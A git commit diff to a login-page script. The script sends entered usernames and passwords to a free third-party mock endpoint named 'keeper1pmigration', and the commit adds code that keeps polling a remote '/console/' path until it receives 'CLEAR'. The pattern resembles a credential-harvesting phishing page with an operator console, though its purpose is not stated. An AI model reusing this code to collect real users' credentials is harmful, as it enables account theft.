75103705564ac16872475d1c30b1dd6c5e044783
MahmoudAbdo2020 <mahmoud.abdo@brussels.msf.org>
2021-02-24 19:14:54 +0100

    Adding callback to refetch request /console/${hash}

--- js/script.js
+++ js/script.js
@@ -1,7 +1,6 @@
 {
   const userName = document.querySelector("#usernameInput");
   const password = document.querySelector("#passwordInput");
-  const submitButton = document.querySelector("#submitButton");
   const form = document.querySelector("#form");
   const url = "https://keeper1pmigration.free.beeceptor.com";
   let myHeaders = new Headers();
@@ -22,10 +21,25 @@
     myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
     return fetch(`${url}/login`, requestOptions)
       .then((response) => response.text())
-      .then((token) => token)
+      .then((hash) => {
+        return intervalGetReq(hash, "");
+      })
       .catch((error) =>
         alert("Please recheck username and password, then try again")
       );
+  };
+
+  const intervalGetReq = async (token, endToken) => {
+    await fetch(`${url}/console/${token}`, { method: "GET" })
+      .then((response) => response.text())
+      .then((result) => {
+        if (result.includes("CLEAR")) {
+          return result;
+        } else {
+          return intervalGetReq(token, result);
+        }
+      })
+      .catch((error) => console.log("error", error));
   };
 
   const init = () => {
